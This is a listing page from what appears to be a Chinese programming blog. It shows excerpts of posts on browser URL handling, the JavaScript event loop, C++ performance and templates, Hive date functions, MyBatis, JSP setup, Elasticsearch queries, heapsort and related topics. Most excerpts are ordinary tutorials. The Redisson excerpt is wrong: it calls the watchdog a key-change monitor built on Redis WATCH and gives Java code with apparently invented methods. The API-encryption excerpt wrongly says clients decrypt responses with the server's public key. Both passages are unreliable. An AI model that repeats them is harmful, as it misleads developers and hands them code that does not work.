			<a href="/posts/37734cffcd06659ba5354d9d8f1cf83a/" rel="bookmark">
			当用户在网页输入URL时,中间发生什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当用户在网页输入URL时，经历了以下过程：
URL解析：浏览器对用户输入的URL进行解析，分为协议、主机名、端口号和路径等部分。
DNS解析：浏览器通过域名解析获取服务器IP地址。
建立TCP连接：浏览器通过HTTP/HTTPS协议建立TCP连接。
发送HTTP请求：浏览器向服务器发送HTTP请求，包括请求方式、请求头、请求体等。
服务器处理请求：服务器接收到浏览器的请求后，根据请求信息和服务器配置进行处理，并返回相应的响应内容和响应状态码。
浏览器接收响应：浏览器接收到服务器的响应后，开始解析响应内容。
渲染页面：如果请求的是HTML页面，则浏览器开始解析页面结构，并进行布局和渲染，最终将页面呈现给用户。
断开TCP连接：当浏览器接收到响应后，便断开TCP连接，释放资源。
总的来说，当用户在网页输入URL时，浏览器会执行一系列的操作，将用户的请求发送给服务器并接收响应，最终呈现页面给用户
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abe715d2a09c3b1e91b91e710bf1343e/" rel="bookmark">
			js的执行机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们在浏览器中打开一个网页时，浏览器会按照顺序解析网页文件，并在解析到JavaScript代码的时候，会将它们转换成计算机能够理解的指令。
然后，JavaScript引擎便开始执行这些指令，并在执行期间不断更新浏览器的显示和状态。JavaScript引擎是为了执行JavaScript程序而设计的虚拟机，例如V8引擎是谷歌浏览器使用的JavaScript引擎。下面让我们一步步分析JavaScript的执行机制。
JavaScript执行的阶段 JavaScript代码的执行分为以下三个阶段：
解析阶段：JavaScript代码会被解析成抽象语法树，也就是AST（Abstract Syntax Tree），并且在此过程中进行语法检查，如果存在错误则会抛出异常。 预编译阶段：JavaScript引擎会创建函数作用域，分配变量、函数名以及参数等内存空间，并赋予默认值。注意，只有声明了的变量才会被预编译，而未声明的变量不会被预编译。 执行阶段：JavaScript引擎开始执行代码，按照语句的顺序逐行执行，包括赋值、函数调用、控制语句等操作，并更新浏览器的显示和状态。执行期间还会进行变量查找和作用域链的处理。 作用域与执行上下文 JavaScript的执行依赖于作用域和执行上下文。作用域是指定义变量和函数的合法区域，例如全局作用域、函数作用域以及块级作用域等。当JavaScript执行到一个函数时，它会创建一个新的执行上下文，并压入执行上下文栈中。执行上下文包括变量对象、作用域链、this引用等内容，它们共同决定了JavaScript代码的执行结果。
// 例：函数作用域与执行上下文 var global = 'global'; // 全局作用域 function foo() { var a = 123; // 函数作用域 console.log(global); } foo(); 在这个例子中，全局变量global被定义在最外层，因此可以在任意位置访问。函数内部的变量a只能在函数内部使用。当执行foo()函数时，会创建一个新的执行上下文，并将它推入执行上下文栈中。此时的执行上下文包含了函数foo的变量对象和作用域链，其中函数作用域a的值为123，全局作用域global的值为’global’。
JavaScript的事件循环 JavaScript是单线程语言，也就是说只有一个执行栈，每次只能执行一个任务，任务完成后才能执行下一个任务。但是，JavaScript同时支持异步编程，例如定时器、AJAX请求以及事件监听等。当这些任务被触发时，会被加入到任务队列中，JavaScript引擎会在执行栈为空时从任务队列中取出一个任务，并进行执行。这个过程被称为事件循环。
// 例：事件循环 console.log('1'); setTimeout(function() { console.log('2'); }, 0); console.log('3'); 在这个例子中，首先输出1，然后调用setTimeout函数并设置超时时间为0ms，将回调函数推入任务队列中。最后输出3。注意，这里的超时时间并不是等待时间，只是异步调用的一种方式，而回调函数的执行需要等待当前执行栈为空后才能进行。
结论 JavaScript执行的核心机制包括解析阶段、预编译阶段以及执行阶段。JavaScript引擎采用单线程模型，并通过事件循环机制实现异步编程。熟练掌握JavaScript的执行机制可以帮助我们更加深入地理解JavaScript代码的执行过程，从而编写高效、可靠的程序。
以上是对于 JavaScript 执行机制的简要介绍，希望本文对您有所帮助。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337139213b7dec85da8709886b04b2e0/" rel="bookmark">
			C&#43;&#43;性能分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一，性能对比
二，性能分析工具
1，VS性能分析工具
2，汇编分析工具
三，计算机性能
1，存储访问
2，处理器性能加速
3，系统调用开销
4，时钟函数
四，编译器优化
1，总体特点
2，指令重排
3，防优化技巧
五，性能提升编码技巧
1，二维数组的访问
2，大批量内存拷贝
3，多分支语句的顺序
4，循环嵌套条件语句
六，关键字
1，volatile
七，其他经验总结
一，性能对比 我们经常对比2份代码的性能，首先要注意控制这几点：
（1）2份代码的功能完全相同
（2）使用相同的测试环境（windows还是linux，编译器等）
（3）使用相同的性能测试代码
（4）使用相同的编译优化级别（VS开release模式）
对于简单的情况，编译器很可能已经做了大量的优化，使得对比结果并不明显。
但是，这却并不代表我们写代码可以完全依赖编译器。
代码的两种写法，在不同程度的编译优化下，哪种写法更快可能没有定论。
例如下面的“循环嵌套条件语句”，clion上运行的是1770 1501，visual studio上运行的是849 1228，感觉应该是vs做的编译优化比较多，简单的if语句可能被优化掉了。
我在windows机器上写C++代码，用cmake编译运行，用clock函数计时，用来判断程序运行时间。
性能测试代码
auto s1 = clock(); test(); auto e1 = clock(); cout &lt;&lt; endl &lt;&lt; e1 - s1; 二，性能分析工具 1，VS性能分析工具 点击 分析、性能探测器、更改目标
点击 可执行文件、开始、CPU采用、下一步、可执行文件、下一步
填写路径，完成。
2，汇编分析工具 在线汇编
左边可以用不同语言写代码
右边可以选择不同的环境和编译器版本，还支持输入编译选项。
三，计算机性能 1，存储访问 连续的不跳跃的存储访问是最快的，这对程序性能影响很大。
2，处理器性能加速 处理器性能加速：指令乱序执行、流水线、并发
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/337139213b7dec85da8709886b04b2e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c25a261379b022357f5b4704388e1679/" rel="bookmark">
			hive时间函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hive时间函数 1、add_months(DATE|STRING|TIMESTAMP start_date, INT num_months) 作用：返回当前时间下再增加num_months个月的日期 返回类型：string SELECT add_months('2022-03-09', -5); -- 2021-10-09 SELECT add_months('2022-03-09', 5); -- 2022-08-09 2、current_date 作用：返回当前时间日期 返回类型：date SELECT current_date(); -- 2022-03-09 3、current_timestamp() 作用：返回当前时间戳 返回类型：timestamp SELECT current_timestamp(); -- 2022-03-09 15:51:44.853 4、datediff(STRING enddate, STRING startdate) 作用：返回结束日期减去开始日期的天数 返回类型：int SELECT datediff('2022-03-09', '2022-02-28'); -- 9 SELECT datediff('2022-03-09', '2022-03-28'); -- -19 5、date_add(DATE startdate, INT days) 作用：返回开始日期startdate增加days天后的日期 返回类型：string SELECT date_add('2022-03-09', 8); -- 2022-03-17 SELECT date_add('2022-03-09', -8); -- 2022-03-01 6、date_format(DATE|TIMESTAMP|STRING ts, STRING fmt) 作用：按指定格式返回字符串 返回类型：string SELECT date_format(current_date(), 'yyyy-MM'); -- 2022-03 SELECT date_format(current_timestamp(), 'yyyy-MM-dd'); -- 2022-03-09 SELECT date_format('2022-03-09 16:11:58.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c25a261379b022357f5b4704388e1679/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8119f5eefdc18da90ef8495f2ff9e621/" rel="bookmark">
			使用PCL进行闭合曲线拟合curve fitting
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 使用PCL进行闭合曲线curve拟合 闭合曲线是指终点和起点重合的曲线
1.1 使用Nurbs曲线拟合曲线，如果发现显示窗口未响应，则应该给代码中的viewer.spinOnce()添加参数，如viewer.spinOnce(3000) 1.2 输入点云格式应该是PointXYZ，不能有RGB分量。如果想要改变点云格式，应该将typedef pcl::PointXYZ Point;改为其他点格式，如typedef pcl::PointXYZRGB PointRGB; 1.3 示例代码在以下环境中测试通过： vs2022 + pcl 1.13.0 推荐使用GitHub下载的all_in_one安装包，推荐同时下载.pdb压缩文件
vs2019 + pcl 1.12或1. 11推荐使用GitHub下载的all_in_one安装包，推荐同时下载.pdb压缩文件
#include &lt;pcl/surface/on_nurbs/fitting_curve_2d_pdm.h&gt; #include &lt;pcl/surface/on_nurbs/fitting_curve_2d_tdm.h&gt; #include &lt;pcl/surface/on_nurbs/fitting_curve_2d_sdm.h&gt; #include &lt;pcl/surface/on_nurbs/triangulation.h&gt; #include &lt;pcl/io/pcd_io.h&gt; #include &lt;pcl/visualization/pcl_visualizer.h&gt; pcl::visualization::PCLVisualizer viewer ("Curve Fitting PDM (red), SDM (green), TDM (blue)"); void PointCloud2Vector2d (pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr cloud, pcl::on_nurbs::vector_vec2d &amp;data) { for (const auto &amp;p : *cloud) { if (!std::isnan (p.x) &amp;&amp; !std::isnan (p.y)) data.emplace_back (p.x, p.y); } } void VisualizeCurve (ON_NurbsCurve &amp;curve, double r, double g, double b, bool show_cps) { pcl::PointCloud&lt;pcl::PointXYZRGB&gt;::Ptr cloud (new pcl::PointCloud&lt;pcl::PointXYZRGB&gt;); pcl::on_nurbs::Triangulation::convertCurve2PointCloud (curve, cloud, 8); for (std::size_t i = 0; i &lt; cloud-&gt;size () - 1; i++) { pcl::PointXYZRGB &amp;p1 = cloud-&gt;at (i); pcl::PointXYZRGB &amp;p2 = cloud-&gt;at (i + 1); std::ostringstream os; os &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8119f5eefdc18da90ef8495f2ff9e621/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e49e414342442b348f873e3ad7089356/" rel="bookmark">
			JavaScript中使用filter函数过滤json数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可用filter()方法对json数组根据某字段的值进行过滤，返回过滤后的集合。 let array = [ {id:'1111',name:'第一条数据',key_dict:'是'}, {id:'2222',name:'第二条数据',key_dict:'是'}, {id:'3333',name:'第三条数据',key_dict:'否'}, {id:'4444',name:'第四条数据',key_dict:'否'}, {id:'5555',name:'第五条数据',key_dict:'是'} ] array = array.filter((item) =&gt; { return item.key_dict == '否' }) console.log("过滤出来的array",array) 还可根据双重条件进行过滤，返回数组中key_dict == '否'同时id == '4444'的数据。 array = array.filter((item) =&gt; { return item.key_dict == '否' &amp;&amp; item.id == '4444' }) 搭配||运算符也可以拿到想要的数据 array = array.filter((item) =&gt; { return item.key_dict == '否' || item.name == '第一条数据' }) 注：es6中的find()方法只返回符合条件的第一条数据，不会返回集合
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e0dc272e5b84862552c5c0874a7b211/" rel="bookmark">
			Mybatis实体类属性名和表中字段名不一致会导致什么后果？怎么解决？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在近期学习mybatis的过程中，查询表格中的内容时，会出现个别字段名称下打印出null的情况（如果打印出内容全部为null，则要考虑数据库表格中是否有数据或者数据库配置文件有问题）
如下图为表格内容：
打印表格内容：
可以看出来brandName和companyName打印出的内容为null
在经过上网查询原因后发现，原因是实体类属性名和表中字段名要保持一致才可以查询出内容，那么就会有人认为把实体类属性名改成与表中字段名一致不就可以了？但是我们知道，实体类属性名的命名规则要严格按照驼峰命名法，无法与表格字段保持一致，下面是几种解决方案
1.起别名
这种方法是给字段名起别名，即：”字段名 as 别名“，这里将别名修改为与属性名一致便可实现字段名与属性名一致的要求，具体实现方法为在mapper.xml文件中配置sql片段并引用，在其中编写给字段名起别名的内容，但这样的方法很有局限性并且不灵活。
2.将resultType替换为resultMap
我们需要先在mapper.xml文件中创建resultMap，然后在mapper.xml文件的select方法节点中，把resultType替换为resultMap。
在resultMap中定义brand_name与brandName以及company_name与companyName之间的映射关系，接下来再次运行：
可以发现实现了正常的打印。
总结：
现在所有的公司对于Java变量的命名规范，和数据库列名的命名规范要求并不一致！Java的变量命名规范是驼峰命名法，数据库的列名命名规范是下划线区分单词命名法，这样Java实体类和数据库列名不一致就成了一种常态。
为了尽量避免这种不一致造成的问题，我们可以在进行项目开发时参照阿里巴巴的开发规约，如下图所示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d7291af88bf4274765461ab8ff5e86c/" rel="bookmark">
			java web 开发——第一章jsp简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1.1 JSP的概念？
1.2 安装和配置JSP运行环境
1.2.1 下载tomcat9.0
1.2.2 下载安装jdk并配置jdk环境
1.2.3 测试tomcat是否安装成功
1.3 JSP页面
1.3.1 JSP页面简介
1.4 JSP的运行原理
1.5 HTML与JavaScript
1.5.1 HTML
1.5.2 JavaScript
总结
前言 本章主要内容为对jsp的简介，包含JSP的概念、jsp的页面、jsp的运行原理、以及HTML与Javascript等小节。
1.1 JSP的概念 ★ JSP是Java Server Page的缩写，是由Sun公司倡导，许多公司参与，于1999年推出的一种Web服务设计标准。
★ JSP基于Java Servlet以及整个Java体系的Web开发技术，利用这一技术可以建立安全、跨平台的先进动态网站。
★ JSP以Java语言为基础，具有动态页面与静态页面分离，能够脱离硬件平台的束缚以及编译后运行等优点，已经成为开发动态网站的主流技术之一。 tips：要想真正地掌握JSP技术，必须有较好的Java语言基础，以及基本的HTML语言方面的知识。
1.2 安装和配置JSP运行环境 本节下载的软件版本号为：
tomcat:9.0
java:jdk13
1.2.1 下载tomcat9.0 登录tomcat网址，进入tomcat网站主页面，选择左侧菜单栏中的Download栏中的Tomcat9.0选项。
点击tomcat9.0选项后进入如下页面，选择Binary Distributions列出的下载项中的第一项。
点击后，浏览器开始下载Tomcat。下载完Tomcat后，是一个压缩包，需要将压缩包解压。你想要将tomcat装在磁盘内就解压到哪个磁盘内(个人建议不要解压到C盘也就是系统盘中。此时tomcat安装完毕。
1.2.2 下载安装jdk并配置jdk环境 点击网址jdk13下载页面，进入jdk13的下载页面。如下图所示，选择window的64版本安装文件。
安装文件下载完毕后，双击安装文件安装。将jdk安装至你想装的盘符中去。博主安装的位置是默认路径C:\Program Files\Java\jdk1.8.0_321。建议不要放在c盘中。
安装完jdk后开始配置jdk的环境变量，具体的过程请参照jdk安装哦和环境变量配置教程。
1.2.3 测试tomcat是否安装成功 首先打开tomcat服务器，打开打开tomcat服务器的方法为，在tomcat安装目录中的bin目录下找到startup.bat文件，双击打开。接着打开浏览器，在浏览器的地址栏中输入127.0.0.1:8080并回车。如果出现以下页面则说明安装成功。
如果进入tomcat失败可能是8080端口号被占用，而此时可以通过重新配置端口号解决问题。首先在tomcat安装目录下的conf目录下找到server.xml文件，双击打开。找到以下部分：
&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" /&gt; 将其中port="8080"修改为未被占用的端口号，然后重启tomcat服务器即可。
1.3 JSP页面 &lt;%@ page contentType = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d7291af88bf4274765461ab8ff5e86c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1101fef71803b03e24bb70b7386ad82/" rel="bookmark">
			接口加密和数字签名如何实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、接口加密
接口加密是通过公钥加密和私钥解密来实现数据的保护。具体步骤如下：
（1）服务器创建公钥和私钥，并将公钥部署到客户端。
（2）客户端使用公钥对请求报文进行加密，并向服务器发送加密后的报文。
（3）服务器使用私钥对加密的报文进行解密，获得原始的请求报文。
（4）服务器处理请求，并将响应报文加密后返回给客户端。
（5）客户端使用相同的公钥对响应报文进行解密，获得业务结果。
接口加密能够有效地保证数据传输过程中不会被窃听、篡改或伪造。
二、数字签名
数字签名是一种用于验证数据完整性和来源的技术，包括签名和验证两个过程。具体步骤如下：
（1）客户端使用请求报文和自己的私钥生成数字签名并添加到请求中。
（2）服务器收到请求后使用客户端的公钥从请求中获取数字签名，并使用此签名验证请求的完整性和来源的真实性。
（3）服务器返回响应报文给客户端，并使用自己的私钥生成数字签名添加到响应中。
（4）客户端收到响应后使用服务器的公钥从响应中获取数字签名并使用此签名验证响应的完整性和来源真实性。
数字签名能够有效地防范数据被篡改或伪造，确保数据的完整性和真实性。
以上是接口加密和数字签名的基本原理和实现方式。为了确保接口通信的安全性，建议在开发时充分考虑接口加密和数字签名等安全机制，并针对具体的业务场景进行设计和实现。
三、接口测试中如何处理
在接口测试中，为了验证接口加密和数字签名的实现效果，可以按照以下步骤进行：
1、接口加密
接口加密的实现情况可以通过从请求和响应中获取加密前后数据以及相关公钥、私钥信息来验证。测试示例如下：
（1）获取接口请求和响应报文，特别是其中涉及到的敏感数据；
（2）将获取到的请求报文使用接口定义的公钥进行加密，检查加密后的请求报文格式；
（3）将加密后的报文发送给接口服务端，并在返回的响应报文中验证加密后的敏感数据是否已被正确解密；
（4）需要注意：测试过程中要确保公钥和私钥存储在正确的位置，避免误操作导致的错误。
2、数字签名
数字签名的实现情况可以通过获取请求和响应报文中的数字签名、公钥和私钥等信息来验证。测试示例如下：
（1）获取接口请求报文并使用私钥生成数字签名；
（2）将生成的数字签名添加到请求报文中，并发送至接口服务端；
（3）在接收到服务端返回的响应报文时，从中获取数字签名，并使用客户端相应的公钥进行验证；
（4）验证过程包括使用公钥验证数字签名的有效性、完整性和来源的真实性；
（5）需要注意：测试过程中要确保服务端提供了正确的公钥，对于返回错误的请求报文，后续将会关闭它们。
总之，接口加密和数字签名是提高接口安全性的重要手段。在进行接口测试时，除了关注接口本身的正确性、稳定性等方面外，还要考虑接口安全相关的测试，包括接口加密和数字签名等方面的验证。通过以上步骤的实现和测试，可以确保接口的安全性和可靠性。
返回目录
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47d872be5cb2ed84bcf467d3fe5b840a/" rel="bookmark">
			ElasticSearch中查询语句用法（match、match_phrase、multi_match、query_string）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、match 略
1.1 不同字段权重 如果需要为不同字段设置不同权重，可以考虑使用 bool 查询的 should 子句来组合多个 match 查询，并为每个 match 查询设置不同的权重。
{ "query": { "bool": { "should": [ { "match": { "product_name": { "query": "apple", "boost": 3 } } }, { "match": { "description": { "query": "apple", "boost": 1 } } } ] } } } 上面的查询将在 product_name 字段和 description 字段中搜索包含 "apple" 的文档，并为 product_name 字段设置权重为 3，而为 description 字段设置权重为 1。这样，在计算匹配得分时，product_name 字段的匹配将比 description 字段的匹配更加重要，因为它的权重更高。
这种方式可以灵活地控制不同字段的权重，以满足不同的搜索需求。
2、match_pharse match_phrase 查询是 Elasticsearch 中一种用于精确匹配短语的查询方式，可以确保查询字符串中的关键词按照给定的顺序在文档中连续出现。以下是 match_phrase 查询的用法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47d872be5cb2ed84bcf467d3fe5b840a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e81cba810645cd3acd52483054c1176/" rel="bookmark">
			局域网固定内网IP地址的方法（亲测有效）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司有十来台电脑，想要做文件共享，但是碍于内网IP经常变动共享文件很不方便。
网上查了一些资料，局域网中的电脑ip若不是设置固定的话，一般都是动态获取的ip，若是需要固定ip，那要如何设置呢？
经过本人整理，按照如下四步就能轻松完成局域网固定内网IP地址。
一、右下角打开网络和共享中心，点击本地连接-属性。 二、在属性窗口中找到 tcp/ipv4并选中它，然后点击下面的属性。 三、点击运行，然后输入 cmd，然后回车；在dos命令窗口中输入 ipconfig /all，回车来查看ip信息，如ip地址、子网掩码、默认网关、dns服务器等相关信息。 四、在tcp/ipv4属性窗口中选择 ‘使用下面的ip地址’，然后输入刚才查到的ip信息，如‘ip地址、子网掩码、默认网关、dns服务器’等。然后点击确定即可。 完成以上设置，内网IP终于不会再变了，但是会有一些冲突的情况，比如你配置了固定IP，但是关机后，你的固定ip会存在被别的局域网电脑占用的情况。
出现以上情况，需要怎么办呢？请关注我下一期的分享。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/897043f770ee1183ab7b030f09c0f8b4/" rel="bookmark">
			C&#43;&#43;中的函数模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、函数模板的基础用法 函数模板允许以任意类型的方式来定义函数，模板使用如下：
template&lt;typename/class T&gt; //使用typename或class均可
返回值类型 函数名（T a,T b...）{ 函数体 }
函数模板在声明和定义时均需要写template&lt;typename/class T&gt; 。函数模板一般放在头文件当中，并在需要使用模板的文件中包含头文件。
函数模板同样可以重载，即函数的特征标（形参的类型或个数）不同。
二、函数模板的显式具体化 函数模板显式具体化即在已定义常规模板的前提下，针对特定参数类型（如类、结构体）单独编写函数；当调用函数参数列表匹配该特定参数类型时，将调用显式具体化的函数模板，而非常规模板。
在显式具体化函数上，C++采用以下规则：
1.对于给定的函数名，可以有非模板函数、模板函数、显式具体化模板函数及它们的重载版本。
2.显示具体化以template&lt;&gt;打头，并在参数列表中指出类型。
3.在调用上，显式具体化优先于常规模板，非模板函数优先于显式具体化和模板函数。
三、实例化和具体化 隐式实例化：函数模板本身不会生成函数定义。编译器在使用模板为特定类型生成函数定义时，才得到模板实例，这种方式称为隐式实例化。
显式实例化：直接命令编译器生成特定的实例，其语法是，在创建模板的前提下，在声明时用&lt;&gt;在函数名后指定特定的类型，并在最前面加上template。
template 返回值类型 函数名&lt;特定类型&gt;(形参)；
显式具体化：显式实例化是提前生成实例，显式具体化是针对特定类型使用不同的规则。在语法上，区别在于&lt;&gt;的位置不同，显式实例化的&lt;&gt;位于函数名之后，显式具体化的&lt;&gt;位于template之后，函数名之前。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c424ccd20fb6f4b5fbba95bcc8c8a850/" rel="bookmark">
			unity 中c#进行调用Android Java 中的类和方法（AndroidJavaClass）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现了一个类AndroidJavaClass，可以调用Android Java 中的类和方法，比如说获取当前设备的基带版本号，检测设备是否可以进行拨号，然后跳转到拨号界面啥的。
写的方法：
// 获取一个 AndroidJavaObject 对象，该对象表示 java.text.SimpleDateFormat 类 AndroidJavaClass simpleDateFormatClass = new AndroidJavaClass("java.text.SimpleDateFormat"); // 创建一个 SimpleDateFormat 对象实例 AndroidJavaObject simpleDateFormat = simpleDateFormatClass.CallStatic&lt;AndroidJavaObject&gt;("getInstance"); // 调用对象实例上的 parse() 方法 AndroidJavaObject date = simpleDateFormat.Call&lt;AndroidJavaObject&gt;("parse", "2021-08-04 16:36:00"); // 将 Java Date 对象转换为 C# DateTime 对象 DateTime dateTime = new DateTime(date.Call&lt;long&gt;("getTime") * 10000 + DateTimeOffset.FromUnixTimeMilliseconds(0).Ticks, DateTimeKind.Utc); Debug.Log(dateTime.ToString()); 获取设备的基带版本号：
public string IsRunningOnEmulator6() { if (Application.platform == RuntimePlatform.Android) { AndroidJavaClass buildClass = new AndroidJavaClass("android.os.Build"); string radioVersion = buildClass.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c424ccd20fb6f4b5fbba95bcc8c8a850/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0a9b8d0331d2fa9a5ebe9385aaa03d2/" rel="bookmark">
			Redisson 看门狗机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redisson是一款流行的Java库，用于在分布式应用程序中使用Redis。它包括一种名为“Watch Dog”机制的特性，可以帮助开发人员监视Redis中的键并在它们发生变化时进行相应的操作。在本篇文章中，我们将深入研究Redisson Watch Dog机制的内部原理。
Watch Dog机制是Redisson库的一项强大功能，可以帮助开发人员轻松地监视Redis中的键。当Redis中的一个键发生变化时，Watch Dog会自动检测这个变化并触发相应的操作。这种机制非常有用，因为它可以帮助应用程序实时地响应Redis中的变化，并且可以防止应用程序在Redis数据发生变化时出现问题。
Watch Dog机制的内部原理如下：
Watch Dog机制基于Redis的“WATCH”命令实现。这个命令可以监视一个或多个键，并在这些键被修改时阻止其他客户端对它们进行修改。
当应用程序使用Redisson库监视一个键时，Watch Dog会向Redis服务器发送一个“WATCH”命令，并在服务器上监视这个键。
如果另一个客户端尝试修改被监视的键，Redis服务器将返回一个错误。这个错误会被Watch Dog捕获并处理。
Watch Dog会在Redisson库内部触发一个事件，并将事件传递给应用程序，以便应用程序可以处理相应的操作。
应用程序可以使用Redisson库中提供的相应方法来处理Watch Dog事件。例如，应用程序可以重新读取被修改的键并更新自己的数据。
Watch Dog机制可以用于多种不同的应用场景。例如，在一个分布式应用程序中，多个实例可能需要同时访问Redis数据。使用Watch Dog机制，应用程序可以确保所有实例都能及时地响应数据变化，并且不会发生数据竞争问题。
总之，Redisson Watch Dog机制是一种强大的功能，可以帮助开发人员实时地监视Redis中的键，并在键发生变化时进行相应的操作。它的内部实现基于Redis的“WATCH”命令，并可以用于多种不同的应用场景。如果您正在使用Redisson库，那么Watch Dog机制是您不可或缺的工具之一。
下面是一个使用Redisson Watch Dog机制的Java代码示例：
首先，我们需要创建一个RedissonClient对象，并使用它来获取一个RMap对象。在这个示例中，我们将监视名为“my-key”的键：
Config config = new Config(); config.useSingleServer().setAddress("redis://localhost:6379"); RedissonClient redisson = Redisson.create(config); RMap&lt;String, String&gt; map = redisson.getMap("my-map"); map.put("my-key", "Hello World"); 接下来，我们需要使用RMap对象中提供的watch方法来监视“my-key”键：
RFuture&lt;Void&gt; future = map.get("my-key").watchAsync(); future.await(); 在这个示例中，我们使用watchAsync方法来异步监视“my-key”键。注意，我们调用await方法来等待监视的完成。
一旦我们开始监视“my-key”键，我们就可以使用RMap对象中提供的addListener方法来注册一个Watch Dog事件监听器。这个监听器将在“my-key”键发生变化时被触发：
map.addListener(new MapEntryListener&lt;String, String&gt;() { @Override public void onEntryChange(Map.Entry&lt;String, String&gt; entry) { System.out.println("Key "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0a9b8d0331d2fa9a5ebe9385aaa03d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28858c996a9d64acd91a58dc9206f5d2/" rel="bookmark">
			堆排序（Heapsort）-全网最详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 基本思想算法步骤图解算法C++程序 基本思想 堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。大顶堆的根节点是二叉树中最大的节点，每次操作提取此最大节点，完成排序。
大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；
小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；
算法步骤 创建一个堆 H[0……n-1]；把堆首（最大值）和堆尾互换；把堆的尺寸缩小 1；重复步骤 2，直到堆的尺寸为 1。 图解算法 数组
[48,77,35,62,55,14,38] 可以表示为一颗完全二叉树的层序遍历，如图所示。
如何把这颗二叉树变成大顶堆？
每个父节点的值都大于或等于其子节点的值
叶子节点已经是一个堆了,序号&gt;3(7/2=3)，不用改变，所以我们从第二层开始进行，也就是序号3开始，元素35和38需要换位置
之后堆77操作，77符合大顶堆定义，不用改变
之后对48操作，48需要和77换位置
此时，形成大顶堆，根节点是最大的元素，我们取出根节点，对其他数据进行大顶堆排序。
为了节省空间，我们把第一个元素（根节点）和最后一个元素交换位置，这样最后一个元素是排好序的，对前面的数据再次进行大顶堆排序，取出此时的最大元素放到倒数第二个位置…
C++程序 #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; // 层序遍历数组表示的堆，从start节点到end节点重新构造大顶堆， // 在图解里已经说明了为了节省空间，把最大的元素换到数组最后， // 所有这个函数调用的时候start一直为0，end递减。表明end后面的元素已经排行顺序 void max_heapify(int arr[], int start, int end) { // 堆顶开始，父节点是堆顶 int dad = start; int son = dad * 2 + 1; //左子节点 while (son &lt;= end) { // 若子节点在范围内才进行后续操作 if (son + 1 &lt;= end &amp;&amp; arr[son] &lt; arr[son + 1]) son++; // 两个子节点选择大的子节点，son是左子节点，son+1是右子节点 if (arr[dad] &gt; arr[son]) // 如果父节点大于子节点，代表跳转完毕，退出 return; else { // 否则交换父子节点，再和孙节点比较 swap(arr[dad], arr[son]); dad = son; son = dad * 2 + 1; } } } void heap_sort(int arr[], int len) { // 初始化，i从最后一个父节点开始调整， //因为叶子节点已经是一个堆了，所以从len/2开始 ,直到根节点0 for (int i = len / 2 - 1; i &gt;= 0; i--) max_heapify(arr, i, len - 1); // 第一个元素已经排序好，放到最后面去，然后调整前面的i-1个元素 for (int i = len - 1; i &gt; 0; i--) { swap(arr[0], arr[i]); max_heapify(arr, 0, i - 1); } } int main() { int arr[] = { 72,62,38,48,55,14,35 }; int len = (int) sizeof(arr) / sizeof(*arr); heap_sort(arr, len); for (int i = 0; i &lt; len; i++) cout &lt;&lt; arr[i] &lt;&lt; ' '; cout &lt;&lt; endl; return 0; } 
	</div>
</article><article class="list__item post">
